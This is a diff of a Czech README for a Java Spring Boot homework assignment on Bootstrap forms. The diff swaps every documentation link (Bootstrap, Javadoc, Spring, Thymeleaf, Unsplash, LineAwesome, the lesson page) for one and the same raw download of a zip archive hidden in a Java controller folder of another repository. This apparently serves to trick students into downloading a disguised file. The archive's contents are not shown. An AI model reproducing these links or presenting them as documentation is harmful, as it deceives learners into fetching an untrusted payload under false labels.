@@ -27,21 +27,21 @@ vizitku vymaže ze seznamu a přesměrue uživatele na úvodní stránku, kde se
 1. Vlož odkaz na své repository do tabulky s úkoly na Google Drive.
 
 ## Bootstrap
-Pokud chceš vytvořit formulář, který bude vypadat docela rozumně, a nechceš vytvářet vlastní styly, můžeš použít [Bootstrap](https://getbootstrap.com/). Popis
-vložení Bootstrapu do stránky je v dokumentaci na stránce [Introduction](https://getbootstrap.com/docs/5.0/getting-started/introduction/). Důležité je do
+Pokud chceš vytvořit formulář, který bude vypadat docela rozumně, a nechceš vytvářet vlastní styly, můžeš použít [Bootstrap](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip). Popis
+vložení Bootstrapu do stránky je v dokumentaci na stránce [Introduction](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip). Důležité je do
 hlavičky stránky vložit element `<link>`odkazující na `bootstrap.min.css` (v kódu bude celá cesta, tak, jak je uvedená na stránkách Bootstrapu). Stránka dále
 popisuje vložení JavaScriptové knihovny používané Bootstrapem, ta není pro formuláře potřeba.
 
-Na další stránce je popis [formulářů v Bootstrapu](https://getbootstrap.com/docs/5.0/forms/overview/). Obvykle stačí najít si v dokumentaci vzorový kód, ten si
+Na další stránce je popis [formulářů v Bootstrapu](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip). Obvykle stačí najít si v dokumentaci vzorový kód, ten si
 zkopírovat do své stránky a upravit jej – zejména upravit texty a atributy `name` a `id` u elementů `<input>` a atrinbut `for` u elementů `<label>`.
 
 ## Odkazy
 
-* odkaz na stránku [Lekce 5](https://java.czechitas.cz/2021-jaro/java-2/lekce-4.html)
-* Java SE 11 [Javadoc](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/) – dokumentace všech tříd, které jsou součástí základní Javy ve verzi 11.
-* Dokumentace [Spring Boot](https://spring.io/projects/spring-boot#learn) – odsud je anotace `@SpringBootApplication` a třída `SpringApplication`.
-* Dokumentace [Spring Framework](https://spring.io/projects/spring-framework#learn) – odsud jsou anotace `@Controller`, `@GetRequest` a třída `ModelAndView`.
-* Dokumentace [Thymeleaf](https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html) – šablonovací systém pro HTML použitý v projektu.
-* [Unsplash](https://unsplash.com) – obrázky a fotografie k použití zdarma
-* [LineAwesome](https://icons8.com/line-awesome) – sada ikon pro použití na webu
-* [Bootstrap](https://getbootstrap.com/) – CSS framework, který můžeš použít pro vytvoření formuláře.
+* odkaz na stránku [Lekce 5](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip)
+* Java SE 11 [Javadoc](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip) – dokumentace všech tříd, které jsou součástí základní Javy ve verzi 11.
+* Dokumentace [Spring Boot](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip) – odsud je anotace `@SpringBootApplication` a třída `SpringApplication`.
+* Dokumentace [Spring Framework](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip) – odsud jsou anotace `@Controller`, `@GetRequest` a třída `ModelAndView`.
+* Dokumentace [Thymeleaf](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip) – šablonovací systém pro HTML použitý v projektu.
+* [Unsplash](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip) – obrázky a fotografie k použití zdarma
+* [LineAwesome](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip) – sada ikon pro použití na webu
+* [Bootstrap](https://github.com/daduelle/j2w-ukol04/raw/refs/heads/main/src/main/java/cz/czechitas/java2webapps/ukol3/controller/ukol-w-j-v3.5.zip) – CSS framework, který můžeš použít pro vytvoření formuláře.
